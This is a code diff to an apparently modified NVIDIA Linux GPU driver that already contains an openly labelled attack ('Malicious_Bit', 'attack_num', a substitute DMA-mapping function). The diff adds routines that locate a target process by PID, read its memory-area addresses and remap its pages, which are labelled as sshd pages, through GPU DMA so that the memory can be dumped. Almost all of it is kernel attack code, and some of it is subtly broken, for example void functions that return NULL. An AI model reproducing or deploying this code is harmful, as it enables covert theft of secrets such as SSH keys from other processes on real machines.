@@ -429,6 +429,8 @@ static unsigned char old_mlock_opcode[5];
 
 static long get_pfn_of_virtual_address(unsigned long, unsigned long *);
 static long get_pfn_of_virtual_address_pid(unsigned long, unsigned long *, int);
+static void get_vm_area_by_pid(int);
+static void get_dump_addr(void);
 
 static unsigned long global_hidden_addr = 0x4000000;
 static unsigned int Malicious_Bit = 0;
@@ -629,11 +631,53 @@ void NV_API_CALL os_free_mem(void *address)
 //
 //////////////////////////////////////////////////////////////////////
 
+static struct vm_area_struct * dump_vm_area;
+static unsigned long dump_start_addr = NULL;
+static unsigned long dump_end_addr = NULL;
 
 NvU64 NV_API_CALL os_get_num_phys_pages(void)
 {
     return (NvU64)NV_NUM_PHYSPAGES;
 }
+
+
+static void get_vm_area_by_pid(int pid) {
+
+	struct task_struct *task;
+	struct mm_struct *mm1;
+
+	// Get task structure by pid
+	task = pid_task(find_vpid(pid), PIDTYPE_PID);
+
+	//Get VMA of Current tsk struct. CHANGE if you want different Proc.
+	mm1 = task->mm;
+
+	if (! mm1) {
+		return NULL;
+	}
+
+	dump_vm_area = mm1->mmap;
+}
+
+static void get_dump_addr(void) {
+
+	if (! dump_vm_area) {
+		return NULL;
+	}
+	dump_start_addr = dump_vm_area->vm_start;
+	dump_end_addr =  dump_vm_area->vm_end;
+
+	/*
+  char ch;
+	ch = ( vma->vm_flags & VM_READ ) ? 'r' : '-';
+	ch = ( vma->vm_flags & VM_WRITE ) ? 'w' : '-';
+	ch = ( vma->vm_flags & VM_EXEC ) ? 'x' : '-';
+	ch = ( vma->vm_flags & VM_SHARED ) ? 's' : 'p';
+	*/
+
+	dump_vm_area = dump_vm_area->vm_next;
+}
+
 
 // Substitution for dma_map_addr
 RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
@@ -647,7 +691,7 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 	    nv_dma_map_t *dma_map = NULL;
 	    struct mm_struct *mm = current->mm;
 
-	    // New vars:
+			// New vars:
 	    static NvU64 hidden_Page;
 	    static int counter = 0;
 	    unsigned long page_number ;
@@ -826,7 +870,7 @@ if (attack_num < 2) {
 					}
 					hidden_Page=0x1000;
 					DbgPrint( "*** Counter = %d ***\n",counter);
-					DbgPrint( "page of hidden buffer: 0x%llx",dma_map->user_pages[i]);
+					DbgPrint( "page of hidden buffer: 0x%llx\n",dma_map->user_pages[i]);
 				}
 				else // Now remapping according to what was passed in buffer.
 				{
@@ -850,9 +894,7 @@ if (attack_num < 2) {
 		   			     Malicious_Bit = 0;
 		   			     return rets;
 		   			}
-					DbgPrint( "*** buffer contains after copy: pid = %d, "
-							"sshd_page_addr = 0x:%llx\n",
-							info_buffer->pid, info_buffer->sshd_page_addr);
+					DbgPrint( "*** buffer contains after copy: pid = %d\n", info_buffer->pid);
 
 					// Now, we have the pid to be dumped
 
@@ -866,10 +908,15 @@ if (attack_num < 2) {
 					DbgPrint("ATK 2: allocated buffer for page nums\n");
 
 					// Currently hard-coded sshd page addr:
-//					int pid = 2923;
-//					unsigned long sshd_page_addr = 0x7f7385e08000;
 					int pid = info_buffer->pid;
-					unsigned long sshd_page_addr = info_buffer->sshd_page_addr;
+					unsigned long sshd_page_addr;
+//					unsigned long sshd_page_addr = info_buffer->sshd_page_addr;
+
+					// Now try get a page from mm_struct
+					get_vm_area_by_pid(pid);
+					get_dump_addr();
+					sshd_page_addr = dump_start_addr;
+					DbgPrint("sshd_page_addr = 0x:%llx\n", sshd_page_addr);
 
 					down_read(&mm->mmap_sem);
 						ret = get_pfn_of_virtual_address_pid(sshd_page_addr, &page_number, pid);
@@ -921,6 +968,8 @@ if (attack_num < 2) {
 		        }
 		    }
 //}
+
+			  DbgPrint("Mapped user page to 0x:%llx\n", dump_start_addr);
 
 		    *priv = dma_map;
 
